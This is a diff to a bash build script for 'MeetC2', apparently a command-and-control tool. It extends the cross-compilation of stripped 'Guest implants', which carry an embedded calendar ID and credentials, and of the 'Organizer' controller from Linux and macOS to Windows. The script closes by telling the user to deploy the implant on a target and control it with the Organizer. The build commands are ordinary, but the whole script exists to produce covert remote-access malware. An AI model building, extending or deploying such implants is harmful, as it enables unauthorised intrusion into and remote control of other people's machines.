@@ -1,12 +1,12 @@
 #!/bin/bash
 
 # MeetC2 Builder
-# Builds Guest and Organizer for Linux and macOS (AMD64 & ARM64)
+# Builds Guest and Organizer for Linux, macOS, and Windows (AMD64 & ARM64)
 
 if [ "$1" == "clean" ]; then
     echo "Cleaning build artifacts..."
-    rm -f guest guest-linux guest-linux-arm64 guest-darwin guest-darwin-arm64
-    rm -f organizer organizer-linux organizer-linux-arm64 organizer-darwin organizer-darwin-arm64
+    rm -f guest guest-linux guest-linux-arm64 guest-darwin guest-darwin-arm64 guest-windows.exe guest-windows-arm64.exe
+    rm -f organizer organizer-linux organizer-linux-arm64 organizer-darwin organizer-darwin-arm64 organizer-windows.exe organizer-windows-arm64.exe
     echo "Clean complete."
     exit 0
 fi
@@ -15,14 +15,13 @@ if [ $# -lt 2 ]; then
     echo "Usage: ./build-all.sh <credentials.json> <calendar_id>"
     echo "       ./build-all.sh clean"
     echo ""
-    echo "This builds Guest and Organizer binaries for Linux and macOS."
+    echo "This builds Guest and Organizer binaries for Linux, macOS, and Windows."
     exit 1
 fi
 
 CREDS_FILE="$1"
 CALENDAR_ID="$2"
 
-# Check if credentials file exists
 if [ ! -f "$CREDS_FILE" ]; then
     echo "Error: Credentials file not found: $CREDS_FILE"
     exit 1
@@ -31,12 +30,10 @@ fi
 echo "MeetC2 Complete Build Process"
 echo "================================"
 
-# Download dependencies once
 echo ""
 echo "Downloading dependencies..."
 go mod tidy
 
-# Build Guest implants
 echo ""
 echo "Building Guest implants..."
 echo "--------------------------------"
@@ -59,7 +56,12 @@ GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w -X main.embedCalendarID=$CALEN
 echo "Building Guest for macOS (ARM64)..."
 GOOS=darwin GOARCH=arm64 go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest-darwin-arm64 guest.go
 
-# Build Organizer
+echo "Building Guest for Windows (AMD64)..."
+GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest-windows.exe guest.go
+
+echo "Building Guest for Windows (ARM64)..."
+GOOS=windows GOARCH=arm64 go build -ldflags "-s -w -X main.embedCalendarID=$CALENDAR_ID" -o guest-windows-arm64.exe guest.go
+
 echo ""
 echo "Building Organizer..."
 echo "--------------------------------"
@@ -80,17 +82,22 @@ GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w" -o ../organizer-darwin organi
 echo "Building Organizer for macOS (ARM64)..."
 GOOS=darwin GOARCH=arm64 go build -ldflags "-s -w" -o ../organizer-darwin-arm64 organizer.go
 
+echo "Building Organizer for Windows (AMD64)..."
+GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o ../organizer-windows.exe organizer.go
+
+echo "Building Organizer for Windows (ARM64)..."
+GOOS=windows GOARCH=arm64 go build -ldflags "-s -w" -o ../organizer-windows-arm64.exe organizer.go
+
 cd ..
 
-# Summary
 echo ""
 echo "Build Summary"
 echo "================"
 echo ""
 echo "Guest implants (with embedded credentials):"
-ls -lh guest* 2>/dev/null | grep -E "guest|guest-linux|guest-linux-arm64|guest-darwin|guest-darwin-arm64" || echo "No guest binaries found!"
+ls -lh guest* 2>/dev/null | grep -E "guest|guest-linux|guest-linux-arm64|guest-darwin|guest-darwin-arm64|guest-windows\.exe|guest-windows-arm64\.exe" || echo "No guest binaries found!"
 echo ""
 echo "Organizer binaries:"
-ls -lh organizer* 2>/dev/null | grep -E "organizer|organizer-linux|organizer-linux-arm64|organizer-darwin|organizer-darwin-arm64" || echo "No organizer binaries found!"
+ls -lh organizer* 2>/dev/null | grep -E "organizer|organizer-linux|organizer-linux-arm64|organizer-darwin|organizer-darwin-arm64|organizer-windows\.exe|organizer-windows-arm64\.exe" || echo "No organizer binaries found!"
 echo ""
 echo "Build complete! Deploy Guest on target, control it with Organizer."
